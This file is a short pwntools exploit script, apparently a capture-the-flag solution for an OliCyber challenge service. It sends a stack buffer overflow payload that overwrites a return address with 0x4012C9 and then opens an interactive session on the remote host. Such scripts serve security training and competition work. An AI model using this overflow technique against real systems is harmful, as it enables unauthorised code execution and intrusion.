from pwn import *

r=remote("moreprivateclub.challs.olicyber.it",10016)
r.recv(4810)
r.sendline("198")
r.recv(4180)
r.sendline(b"a"*35+b"a"*12+p64(0)+p64(0x4012C9))
r.interactive()